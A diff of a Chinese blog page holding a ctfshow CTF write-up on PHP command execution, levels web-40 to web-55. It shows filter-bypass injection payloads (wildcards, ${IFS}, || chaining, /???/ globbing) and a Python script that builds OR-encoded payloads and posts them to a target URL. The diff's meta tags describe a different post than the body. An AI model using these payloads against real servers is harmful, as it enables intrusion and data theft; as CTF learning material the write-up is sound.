@@ -6,29 +6,49 @@
   <meta name="keywords" content=" 做题笔记 , 命令执行 ">
   <meta name="description" content="ctfshow-命令执行 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="web-命令执行web-29 发现过滤了flag关键字，这里使用*模糊匹配就行了 1?c&#x3D;system(&#x27;cat fla*&#x27;);  web-30 又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可 1?c&#x3D;passthru(&#x27;cat fla*&#x27;);  web-31 这里又把cat、单引号和空格过滤了，可以把cat换成t">
+<meta name="description" content="web-信息搜集web-1打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了   web-2打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:   web-3页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看 把请求">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-命令执行">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="ctfshow-信息搜集">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="web-命令执行web-29 发现过滤了flag关键字，这里使用*模糊匹配就行了 1?c&#x3D;system(&#x27;cat fla*&#x27;);  web-30 又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可 1?c&#x3D;passthru(&#x27;cat fla*&#x27;);  web-31 这里又把cat、单引号和空格过滤了，可以把cat换成t">
+<meta property="og:description" content="web-信息搜集web-1打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了   web-2打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:   web-3页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看 把请求">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/">
-<meta property="article:published_time" content="2025-02-16T16:00:48.000Z">
-<meta property="article:modified_time" content="2025-02-16T17:36:17.296Z">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-5.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-6.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-7.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-8.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-9.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-10.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-11.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-12.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-13.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-14.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-15.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-16.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-17.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-18.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-19.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-20.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-21.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-22.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-23.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-24.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-25.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-26.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-27.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-28.png">
+<meta property="og:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-29.png">
+<meta property="article:published_time" content="2025-02-23T07:24:36.000Z">
+<meta property="article:modified_time" content="2025-02-23T09:06:22.361Z">
 <meta property="article:author" content="MIXBP">
 <meta property="article:tag" content="做题笔记">
-<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="信息搜集">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png">
+<meta name="twitter:image" content="https://mixbp.github.io/image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -127,7 +147,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(23)</small>
+                <small>(24)</small>
             
         </div>
     </li>
@@ -162,8 +182,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="23">
-<input type="hidden" id="yelog_site_word_count" value="49.6k">
+<input type="hidden" id="yelog_site_posts_number" value="24">
+<input type="hidden" id="yelog_site_word_count" value="54k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -222,6 +242,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息搜集</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -290,6 +314,15 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="做题笔记,信息搜集"
+           data-author="" >
+            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
+            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
+        </a>
         
         
         <a  class="All "
@@ -537,12 +570,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-02-17 01:36:17'>2025-02-17 00:00</time>
+            Created At : <time class="date" title='Updated At: 2025-02-19 22:56:31'>2025-02-17 00:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:945</span>
+        <span>Count:2.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -572,7 +605,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web-命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-29"><span class="toc-text">web-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-30"><span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-31"><span class="toc-text">web-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-32"><span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-33"><span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-34"><span class="toc-text">web-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-35"><span class="toc-text">web-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-36"><span class="toc-text">web-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-37"><span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-38"><span class="toc-text">web-38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-39"><span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-40"><span class="toc-text">web-40</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web-命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-29"><span class="toc-text">web-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-30"><span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-31"><span class="toc-text">web-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-32"><span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-33"><span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-34"><span class="toc-text">web-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-35"><span class="toc-text">web-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-36"><span class="toc-text">web-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-37"><span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-38"><span class="toc-text">web-38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-39"><span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-40"><span class="toc-text">web-40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-41"><span class="toc-text">web-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-42"><span class="toc-text">web-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-43"><span class="toc-text">web-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-44"><span class="toc-text">web-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-45"><span class="toc-text">web-45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-46"><span class="toc-text">web-46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-47"><span class="toc-text">web-47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-48"><span class="toc-text">web-48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-49"><span class="toc-text">web-49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-50"><span class="toc-text">web-50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-51"><span class="toc-text">web-51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-52"><span class="toc-text">web-52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-53"><span class="toc-text">web-53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-54"><span class="toc-text">web-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-55"><span class="toc-text">web-55</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -633,9 +666,84 @@
 <p>但是这里试了一下好像不能用base64加密绕过了，所以使用模糊匹配绕过关键字过滤</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fla*&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
-<h2 id="web-40"><a href="#web-40" class="headerlink" title="web-40"></a>web-40</h2><p><img src="/../image/"></p>
+<h2 id="web-40"><a href="#web-40" class="headerlink" title="web-40"></a>web-40</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p>
 <p>看到题目被吓到了以为过滤了小括号，结果发现是中文括号，这里可以使用无参数RCE绕过或者scandir()文件读取都行</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">无参数RCE<br>?c=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br><br>或者<br><br>scandir()文件读取<br>首先，查看当前目录下文件<br>print_r(scandir(current(localeconv())));<br>发现flag.php在第二位，直接show_source读取<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-41"><a href="#web-41" class="headerlink" title="web-41"></a>web-41</h2><p>这题不会直接看的题解</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">对于&#x27;/[0-9]|<span class="hljs-string">[a-z]</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\~</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\]</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\-/i&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p>
+<p>思路如下：</p>
+<ul>
+<li>首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li>
+<li>跟据题目要求，构造payload的原型，并将原型替换为或运算的结果</li>
+<li>使用POST请求发送c,获取flag</li>
+</ul>
+<p><strong>一体化脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> requests<br><br>contents = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_i = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>        hex_j = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(j)<br>        preg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;</span>, re.I)<br>        <span class="hljs-keyword">if</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_i, <span class="hljs-number">16</span>))) <span class="hljs-keyword">or</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_j, <span class="hljs-number">16</span>))):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            a = <span class="hljs-string">&#x27;%&#x27;</span> + hex_i<br>            b = <span class="hljs-string">&#x27;%&#x27;</span> + hex_j<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>) | <span class="hljs-built_in">int</span>(b[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">126</span>:<br>                contents.append([c, a, b])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_payload</span>(<span class="hljs-params">cmd</span>):<br>    payload1 = <span class="hljs-string">&#x27;&#x27;</span><br>    payload2 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> contents:<br>            <span class="hljs-keyword">if</span> i == j[<span class="hljs-number">0</span>]:<br>                payload1 += j[<span class="hljs-number">1</span>]<br>                payload2 += j[<span class="hljs-number">2</span>]<br>                <span class="hljs-keyword">break</span><br>    payload = <span class="hljs-string">&#x27;(&quot;&#x27;</span> + payload1 + <span class="hljs-string">&#x27;&quot;|&quot;&#x27;</span> + payload2 + <span class="hljs-string">&#x27;&quot;)&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><br>URL = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;url:&#x27;</span>)<br>payload = make_payload(<span class="hljs-string">&#x27;system&#x27;</span>) + make_payload(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)<br>response = requests.post(URL, data=&#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)&#125;)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-42"><a href="#web-42" class="headerlink" title="web-42"></a>web-42</h2><p>这题给我们的$c后拼接了一个<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>，该命令让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p>这里可以使用<code>||</code>来绕过，这里用%0a和%26都行</p>
+<p><strong>||类似于程序中的if-else语句。若前面的命令执行成功，则后面的命令就不会执行。若前面的命令执行失败，则执行后面的命令</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=cat flag.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-43"><a href="#web-43" class="headerlink" title="web-43"></a>web-43</h2><p>比上一题多过滤了个cat和分号，换tac即可</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-44"><a href="#web-44" class="headerlink" title="web-44"></a>web-44</h2><p>又比上题多过滤了个flag，这里用*号模糊匹配即可</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac fla*||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-45"><a href="#web-45" class="headerlink" title="web-45"></a>web-45</h2><p>比上一题多过滤了个空格，用url编码<code>%09</code>代替空格即可，用<code>$&#123;IFS&#125;</code>也行</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla*||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-46"><a href="#web-46" class="headerlink" title="web-46"></a>web-46</h2><p>又多过滤了<em>号，*<em>可以用?或者\转义绕过</em></em></p>
+<p><strong>用’’和””空字符绕过也行</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br><br>或者<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac&lt;fla\g.php||<br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl&#x27;&#x27;ag.php||<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl<span class="hljs-string">&quot;&quot;</span>ag.php||<br><br>注意：用了?就不能用重定向符&lt;来绕过空格了<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-47"><a href="#web-47" class="headerlink" title="web-47"></a>web-47</h2><p>又多过滤了一些命令more、less、head、sort、tail，用上一关的payload就行了</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-48"><a href="#web-48" class="headerlink" title="web-48"></a>web-48</h2><p>还是没过滤tac，一样</p>
+<h2 id="web-49"><a href="#web-49" class="headerlink" title="web-49"></a>web-49</h2><p>还是一样</p>
+<h2 id="web-50"><a href="#web-50" class="headerlink" title="web-50"></a>web-50</h2><p>依然可以用tac绕过，但是%和制表符被过滤了</p>
+<p>注意：这里过滤了&#x2F;x09即制表符</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac&lt;fl\ag.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-51"><a href="#web-51" class="headerlink" title="web-51"></a>web-51</h2><p>这题过滤了tac和%，用nl和&lt;绕过就行了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=nl&lt;fl\ag.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-52"><a href="#web-52" class="headerlink" title="web-52"></a>web-52</h2><p>这题把&lt;给过滤了，但是没过滤字母和$符号以及大括号，所以能用${IFS}代替空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$&#123;IFS&#125;</span>fl\ag.php||<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-53"><a href="#web-53" class="headerlink" title="web-53"></a>web-53</h2><p>一样用$IFS即可</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=nl<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br>或者<br><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-54"><a href="#web-54" class="headerlink" title="web-54"></a>web-54</h2><p>这里用了</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">.*c</span>.*a.*t.*|<span class="hljs-type">这种匹配方式</span><br><span class="hljs-type">匹配包含字符 c</span>、a、t 的任意顺序的字符串，例如 cat、cbaat 等<br></code></pre></td></tr></table></figure>
+
+<p>所以可以这样绕过，通过命令路径来使用cat命令（linux路径下万物皆文件）</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/ca</span>?<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;f?<span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br>或者<br><span class="hljs-string">?c</span>=rev<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla?.php<br>输出出来是反转的<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-55"><a href="#web-55" class="headerlink" title="web-55"></a>web-55</h2><p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin目录下的可执行程序。</p>
+<p>但因为字母不能传入，我们需要使用通配符?来进行代替</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/base</span>64 flag.php<br>替换为<br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>即/usr/bin/bzip2 flag.php<br>把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。<br></code></pre></td></tr></table></figure>
+
+<p>这里也可以用文件上传加读取</p>
+<p>先构造一个文件上传的POST数据包；</p>
+<p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p>
+<p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p>
+<p>用python脚本直接完成，也可以写个表单去上传都行</p>
